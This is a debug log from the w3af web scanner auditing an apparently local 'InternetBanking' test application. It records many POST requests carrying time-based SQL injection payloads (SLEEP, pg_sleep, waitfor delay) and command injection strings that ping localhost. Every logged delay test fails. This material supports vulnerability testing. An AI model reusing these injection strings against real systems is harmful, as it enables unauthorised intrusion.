[Fr 20 Nov 2015 21:33:27 CET - information] Enabling redos's dependency server_header
[Fr 20 Nov 2015 21:33:27 CET - information] Enabling dav's dependency allowed_methods
[Fr 20 Nov 2015 21:33:29 CET - information] Enabling frontpage's dependency frontpage_version
[Fr 20 Nov 2015 21:33:34 CET - debug] Called w3afCore.start()
[Fr 20 Nov 2015 21:33:34 CET - debug] Enabling _dns_cache()
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ] plugins
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ]     audit file_upload, eval, un_ssl, os_commanding, lfi, sqli, preg_replace, mx_injection, generic, format_string, websocket_hijacking, shell_shock, memcachei, ldapi, buffer_overflow, redos, global_redirect, xpath, cors_origin, htaccess_methods, dav, ssi, csrf, xss, ssl_certificate, xst, blind_sqli, phishing_vector, response_splitting, rfd, rfi, frontpage
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=ping -n 4 localhost" returned HTTP code "200" (id=7545,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181474576) 6.23721295595 > 0.0550270080566 > 2.97364300489
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181474576) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: windows, Separator: "", Command: "ping -n %s localhost")>, response wait time was: 0.0550270080566 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=7546,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7547,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=5 OR 5=5 " returned HTTP code "200" (id=7548,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7549,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7550,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=18437601" returned HTTP code "200" (id=7551,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7552,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=7553,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=1%20or%20SLEEP%283%29 with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7554,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181634832) 6.19543576241 > 0.0618898868561 > 2.97828491529
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181634832) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1 or SLEEP(%s), delta:0, mult:1)>, response wait time was: 0.0618898868561 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7555,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=5 AND 5=6 " returned HTTP code "200" (id=7556,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7557,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7558,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=run ping -n 4 localhost&userid=1&email=1@2.com" returned HTTP code "200" (id=7559,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709156842640) 6.2024384737 > 0.0626349449158 > 2.97750683626
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709156842640) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "balance" for 3 seconds using <Command (OS: windows, Separator: "run ", Command: "run ping -n %s localhost")>, response wait time was: 0.0626349449158 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1);waitfor delay '0:0:3'--" returned HTTP code "200" (id=7560,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140710958450064) 6.2013412714 > 0.0567331314087 > 2.97762874762
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140710958450064) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1);waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0567331314087 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7561,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7562,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7563,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7564,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7565,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=&&ping -n 4 localhost" returned HTTP code "200" (id=7566,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709156842000) 6.186175704 > 0.0380070209503 > 2.97931381067
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709156842000) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: windows, Separator: "&&", Command: "&&ping -n %s localhost")>, response wait time was: 0.0380070209503 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7567,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=ping -c 4 localhost" returned HTTP code "200" (id=7568,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709597423440) 6.17948752642 > 0.0510501861572 > 2.98005694151
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709597423440) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: unix, Separator: "", Command: "ping -c %s localhost")>, response wait time was: 0.0510501861572 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7569,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7570,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] Updating socket timeout for 192.168.2.130 from 1.04075471163 to 0.614344668388 seconds
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7571,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7572,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7573,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7574,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1;waitfor delay '0:0:3'--" returned HTTP code "200" (id=7575,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195057616) 6.14747911692 > 0.0366940498352 > 2.98361343145
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195057616) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1;waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0366940498352 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7576,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=1%27%20or%20SLEEP%283%29%20and%20%271%27%3D%271 with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7577,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709597423632) 6.18597972393 > 0.0416789054871 > 2.97933558623
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709597423632) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1' or SLEEP(%s) and '1'='1, delta:0, mult:1)>, response wait time was: 0.0416789054871 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7578,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1));waitfor delay '0:0:3'--" returned HTTP code "200" (id=7579,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709182031696) 6.14150834084 > 0.0354039669037 > 2.98427685102
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709182031696) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1));waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0354039669037 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7580,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7581,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7582,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7583,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7584,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7585,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=&&ping -c 4 localhost" returned HTTP code "200" (id=7586,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195467920) 6.15095490217 > 0.0302419662476 > 2.98322723309
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195467920) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: unix, Separator: "&&", Command: "&&ping -c %s localhost")>, response wait time was: 0.0302419662476 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7587,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=/usr/sbin/ping -s localhost 4" returned HTTP code "200" (id=7588,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181474576) 6.15591984987 > 0.0166170597076 > 2.98267557224
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181474576) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: unix, Separator: "", Command: "/usr/sbin/ping -s localhost %s")>, response wait time was: 0.0166170597076 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7589,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7590,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7591,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7592,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7593,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7594,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7595,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1);waitfor delay '0:0:3'--" returned HTTP code "200" (id=7596,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195056720) 6.16496622562 > 0.0853099822998 > 2.98167041938
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709195056720) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1);waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0853099822998 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7597,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=1%22%20or%20SLEEP%283%29%20and%20%221%22%3D%221 with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7598,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=P1ObOiQD&requestid=20" returned HTTP code "200" (id=7599,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181634832) 6.16789662838 > 0.0849258899689 > 2.98134481907
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140709181634832) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1" or SLEEP(%s) and "1"="1, delta:0, mult:1)>, response wait time was: 0.0849258899689 seconds.
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7600,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1';waitfor delay '0:0:3'--" returned HTTP code "200" (id=7601,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=7602,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140710958450064) 6.1727719903 > 0.0965960025787 > 2.98080311219
[Fr 20 Nov 2015 21:52:26 CET - debug] (Test id: 140710958450064) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1';waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0965960025787 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7603,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7604,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7605,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7606,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7607,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=7608,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=d'kc"z'gj'"**5*(((;-*`)&requestid=20" returned HTTP code "200" (id=7609,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7610,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=&&ping -n 4 localhost" returned HTTP code "200" (id=7611,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709597423440) 6.21251106262 > 0.0801029205322 > 2.97638765971
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709597423440) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: windows, Separator: "&&", Command: "&&ping -n %s localhost")>, response wait time was: 0.0801029205322 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=&&/usr/sbin/ping -s localhost 4" returned HTTP code "200" (id=7612,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709156842000) 6.23802906275 > 0.0702450275421 > 2.97355232636
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709156842000) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <Command (OS: unix, Separator: "&&", Command: "&&/usr/sbin/ping -s localhost %s")>, response wait time was: 0.0702450275421 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7613,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7614,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=5JxJgQPJ&requestid=20" returned HTTP code "200" (id=7615,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=7616,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7617,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7618,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] Updating socket timeout for 192.168.2.130 from 0.614344668388 to 0.615530347824 seconds
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7619,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7620,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=ping -n 4 localhost&email=1@2.com" returned HTTP code "200" (id=7621,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709196893136) 6.26126039028 > 0.0753979682922 > 2.97097106775
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709196893136) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "userid" for 3 seconds using <Command (OS: windows, Separator: "", Command: "ping -n %s localhost")>, response wait time was: 0.0753979682922 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7622,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1));waitfor delay '0:0:3'--" returned HTTP code "200" (id=7623,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709156879376) 6.22844588757 > 0.0730948448181 > 2.9746171236
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709156879376) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1));waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0730948448181 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=&requestid=20" returned HTTP code "200" (id=7624,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=1%20or%20pg_sleep%283%29 with data: "approve=reject&requestid=20" returned HTTP code "200" (id=7625,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709182185040) 6.21920692921 > 0.0710420608521 > 2.97564367453
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709182185040) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1 or pg_sleep(%s), delta:0, mult:1)>, response wait time was: 0.0710420608521 seconds.
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7626,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=19" returned HTTP code "200" (id=7627,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=approveregistrations with data: "approve=reject&requestid=1');waitfor delay '0:0:3'--" returned HTTP code "200" (id=7628,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709182031696) 6.21541553736 > 0.0856721401215 > 2.97606494029
[Fr 20 Nov 2015 21:52:27 CET - debug] (Test id: 140709182031696) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "requestid" for 3 seconds using <ExactDelay (fmt:1');waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0856721401215 seconds.
